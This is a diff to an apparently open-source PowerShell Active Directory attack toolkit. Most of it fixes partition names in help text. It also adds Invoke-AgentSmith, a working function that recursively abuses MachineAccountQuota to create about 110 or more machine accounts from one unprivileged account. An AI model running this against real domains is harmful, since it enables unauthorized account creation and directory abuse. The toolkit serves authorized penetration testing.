@@ -544,9 +544,12 @@ function Get-MachineAccountCreator
         
         $machine_account_searcher = New-Object DirectoryServices.DirectorySearcher 
         $machine_account_searcher.SearchRoot = $directory_entry  
-        $machine_accounts = $machine_account_searcher.FindAll() | Where-Object {$_.properties.objectcategory -match "CN=computer"}  
+        $machine_account_searcher.PageSize = 1000
+        $machine_account_searcher.Filter = '(&(ms-ds-creatorsid=*))'
+        $machine_account_searcher.SearchScope = 'Subtree'
+        $machine_accounts = $machine_account_searcher.FindAll()
         $creator_object_list = @()
-                                                    
+            
         ForEach($account in $machine_accounts)
         {
             $creator_SID_object = $account.properties."ms-ds-creatorsid"
@@ -576,8 +579,8 @@ function Get-MachineAccountCreator
                 {
                     Add-Member -InputObject $creator_object -MemberType NoteProperty -Name Creator $creator_SID
                 }
-
-                Add-Member -InputObject $creator_object -MemberType NoteProperty -Name "Machine Account" $account.properties.samaccountname[0]
+                
+                Add-Member -InputObject $creator_object -MemberType NoteProperty -Name "Machine Account" $account.properties.name[0]
                 $creator_object_list += $creator_object
                 $creator_SID_object = $null
             }
@@ -596,6 +599,188 @@ function Get-MachineAccountCreator
     if($directory_entry.Path)
     {
         $directory_entry.Close()
+    }
+
+}
+
+function Invoke-AgentSmith
+{
+    <#
+    .SYNOPSIS
+    This function leverages New-MachineAccount to recursively create as as many machine accounts as possible
+    from a single unprivileged account through MachineAccountQuota. With a default MachineAccountQuota of 10,
+    the most common result will be 110 accounts. This is due to the transitive quota of Q + Q * 1 where Q
+    equals the MachineAccountQuota setting. The transitive quota can often be exceeded to the total number of
+    created accounts can vary. I wouldn't recommend running this one on a client network unless you have a
+    good reason.
+
+    .DESCRIPTION
+    This function leverages New-MachineAccount to recursively create as as many machine accounts as possible
+    from a single unprivileged account through MachineAccountQuota.
+    
+    Author: Kevin Robertson (@kevin_robertson)  
+    License: BSD 3-Clause 
+
+    .PARAMETER Credential
+    PSCredential object that will be used enumerate machine account creators.
+
+    .PARAMETER DistinguishedName
+    Distinguished name for the computers OU.
+
+    .PARAMETER Domain
+    The targeted domain in DNS format. This parameter is required when using an IP address in the DomainController
+    parameter.
+
+    .PARAMETER DomainController
+    Domain controller to target. This parameter is mandatory on a non-domain attached system.
+
+    .PARAMETER Domain
+    The targeted domain in netBIOS format. This will be used to create the PSCredential object as the function cycles
+    through the machine accounts.
+
+    .PARAMETER MachineAccountPrefix
+    The prefix for the machine account names. The prefix will be incremented by one for each account creation attempt.
+
+    .PARAMETER MachineAccountQuota
+    The domain's MachineAccountQuota setting.
+    
+    .PARAMETER NoWarning
+    Switch to remove the warning prompt.
+
+    .PARAMETER Password
+    The securestring of the password for the machine accounts.
+
+    .PARAMETER Sleep
+    The delay in milliseconds between account creation attempts.
+
+    .EXAMPLE
+    Invoke-AgentSmith -MachineAccountPrefix test
+
+    .LINK
+    https://github.com/Kevin-Robertson/Powermad
+    #>
+
+    [CmdletBinding()]
+    param
+    ( 
+        [parameter(Mandatory=$false)][String]$DistinguishedName,
+        [parameter(Mandatory=$false)][String]$Domain,
+        [parameter(Mandatory=$false)][String]$DomainController,
+        [parameter(Mandatory=$false)][String]$NetBIOSDomain,
+        [parameter(Mandatory=$false)][String]$MachineAccountPrefix = "AgentSmith",
+        [parameter(Mandatory=$false)][Int]$MachineAccountQuota = 10,
+        [parameter(Mandatory=$false)][Int]$Sleep = 0,
+        [parameter(Mandatory=$false)][System.Security.SecureString]$Password,
+        [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
+        [parameter(Mandatory=$false)][Switch]$NoWarning,
+        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
+    )
+
+    $i = 0
+    $j = 1
+    $k = 1
+    $MachineAccountQuota--
+
+    if(!$NoWarning)
+    {
+        $confirm_invoke = Read-Host -Prompt "Are you sure you want to do this? (Y/N)"
+    }
+
+    if(!$Password)
+    {
+        $password = Read-Host -Prompt "Enter a password for the new machine accounts" -AsSecureString
+    }
+
+    if(!$NetBIOSDomain)
+    {
+
+        try
+        {
+            $NetBIOSDomain = (Get-ChildItem -path env:userdomain).Value
+        }
+        catch
+        {
+            Write-Output "[-] $($_.Exception.Message)"
+            throw
+        }
+
+    }
+
+    if($confirm_invoke -eq 'Y' -or $NoWarning)
+    {
+
+        :main_loop while($i -le $MachineAccountQuota)
+        {
+            $MachineAccount = $MachineAccountPrefix + $j
+            
+            try
+            {
+                $output = New-MachineAccount -MachineAccount $MachineAccount -Credential $Credential -Password $Password -Domain $Domain -DomainController $DomainController -DistinguishedName $DistinguishedName
+
+                if($output -like "*The server cannot handle directory requests*")
+                {
+                    Write-Output "[-] Limit reached with $account"
+                    $switch_account = $true
+                    $j--
+                }
+                else
+                {   
+                    Write-Output $output  
+                    $success = $j
+                }
+
+            }
+            catch
+            {
+
+                if($_.Exception.Message -like "*The supplied credential is invalid*")
+                {
+                    
+                    if($j -gt $success)
+                    {
+                        Write-Output "[-] Machine account $account was not added"
+                        Write-Output "[-] No remaining machine accounts to try"
+                        Write-Output "[+] Total machine accounts added = $($j - 1)"         
+                        break main_loop
+                    }
+
+                    $switch_account = $true
+                    $j--
+                }
+                else
+                {
+                    Write-Output "[-] $($_.Exception.Message)"    
+                }
+
+            }
+
+            if($i -eq 0)
+            {
+                $account =  "$NetBIOSDomain\$MachineAccountPrefix" + $k + "$"
+            }
+
+            if($i -eq $MachineAccountQuota -or $switch_account)
+            {
+                Write-Output "[*] Trying machine account $account"
+                $credential = New-Object System.Management.Automation.PSCredential ($account, $password)
+                $i = 0
+                $k++
+                $switch_account = $false
+            }
+            else
+            {
+                $i++
+            }
+
+            $j++
+
+            Start-Sleep -Milliseconds $Sleep
+        }
+
+    }
+    else
+    {
+        Write-Output "[-] Function exited without adding machine accounts"
     }
 
 }
@@ -1129,7 +1314,7 @@ function Disable-ADIDNSNode
     The ADIDNS node name.
 
     .PARAMETER Partition
-    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZone,System) The AD partition name where the zone is stored.
+    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.
 
     .PARAMETER SOASerialNumber
     The current SOA serial number for the target zone. Note, using this parameter will bypass connecting to a
@@ -1314,7 +1499,7 @@ function Enable-ADIDNSNode
     The ADIDNS node name.
 
     .PARAMETER Partition
-    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZone,System) The AD partition name where the zone is stored.
+    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.
 
     .PARAMETER Port
     SRV record port.
@@ -1529,7 +1714,7 @@ function Get-ADIDNSNodeAttribute
     The ADIDNS node name.
 
     .PARAMETER Partition
-    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZone,System) The AD partition name where the zone is stored.
+    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.
 
     .PARAMETER Zone
     The ADIDNS zone.
@@ -1679,7 +1864,7 @@ function Get-ADIDNSNodeOwner
     The ADIDNS node name.
 
     .PARAMETER Partition
-    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZone,System) The AD partition name where the zone is stored.
+    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.
 
     .PARAMETER Zone
     The ADIDNS zone.
@@ -1829,7 +2014,7 @@ function Get-ADIDNSNodeTombstoned
     The ADIDNS node name.
 
     .PARAMETER Partition
-    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZone,System) The AD partition name where the zone is stored.
+    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.
 
     .PARAMETER Zone
     The ADIDNS zone.
@@ -1937,7 +2122,8 @@ function Get-ADIDNSNodeTombstoned
     catch
     {
 
-        if($_.Exception.Message -notlike '*Exception calling "InvokeGet" with "1" argument(s): "The specified directory service attribute or value does not exist.*')
+        if($_.Exception.Message -notlike '*Exception calling "InvokeGet" with "1" argument(s): "The specified directory service attribute or value does not exist.*' -and
+        $_.Exception.Message -notlike '*The following exception occurred while retrieving member "InvokeGet": "The specified directory service attribute or value does not exist.*')
         {
             Write-Output "[-] $($_.Exception.Message)"
             $directory_entry.Close()
@@ -2001,7 +2187,7 @@ function Get-ADIDNSPermission
     The ADIDNS node name.
 
     .PARAMETER Partition
-    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZone,System) The AD partition name where the zone is stored.
+    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.
 
     .PARAMETER Zone
     The ADIDNS zone.
@@ -2223,7 +2409,7 @@ function Get-ADIDNSZone
     
     .DESCRIPTION
     This function can return ADIDNS zones. The output format is a distinguished name. The distinguished name will
-    contain a partition value of either DomainDNSZones,ForestDNSZone, or System. The correct value can be inputed
+    contain a partition value of either DomainDNSZones,ForestDNSZones, or System. The correct value can be inputed
     to the Partition parameter for other Powermad ADIDNS functions.
 
     .PARAMETER Credential
@@ -2240,7 +2426,7 @@ function Get-ADIDNSZone
     Domain controller to target. This parameter is mandatory on a non-domain attached system.
 
     .PARAMETER Partition
-    (DomainDNSZones,ForestDNSZone,System) The AD partition name where the zone is stored. By default, this
+    (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored. By default, this
     function will loop through all three partitions.
 
     .PARAMETER Zone
@@ -2430,7 +2616,7 @@ function Grant-ADIDNSPermission
     The ADIDNS node name.
 
     .PARAMETER Partition
-    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZone,System) The AD partition name where the zone is stored.
+    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.
 
     .PARAMETER Principal
     The user or group that will be used for the ACE.
@@ -2643,7 +2829,7 @@ function New-ADIDNSNode
     The ADIDNS node name.
 
     .PARAMETER Partition
-    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZone,System) The AD partition name where the zone is stored.
+    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.
 
     .PARAMETER Port
     SRV record port.
@@ -3371,7 +3557,7 @@ function Rename-ADIDNSNode
     The new ADIDNS node name.
 
     .PARAMETER Partition
-    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZone,System) The AD partition name where the zone is stored.
+    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.
 
     .PARAMETER Zone
     The ADIDNS zone.
@@ -3519,7 +3705,7 @@ function Remove-ADIDNSNode
     The ADIDNS node name.
 
     .PARAMETER Partition
-    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZone,System) The AD partition name where the zone is stored.
+    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.
 
     .PARAMETER Zone
     The ADIDNS zone.
@@ -3672,7 +3858,7 @@ function Revoke-ADIDNSPermission
     The ADIDNS node name.
 
     .PARAMETER Partition
-    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZone,System) The AD partition name where the zone is stored.
+    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.
 
     .PARAMETER Principal
     The ACE user or group.
@@ -3872,7 +4058,7 @@ function Set-ADIDNSNodeAttribute
     The ADIDNS node name.
 
     .PARAMETER Partition
-    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZone,System) The AD partition name where the zone is stored.
+    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.
 
     .PARAMETER Value
     The attribute value.
@@ -4039,7 +4225,7 @@ function Set-ADIDNSNodeOwner
     The ADIDNS node name.
 
     .PARAMETER Partition
-    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZone,System) The AD partition name where the zone is stored.
+    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.
 
     .PARAMETER Principal
     The user or group that will be granted ownsership.
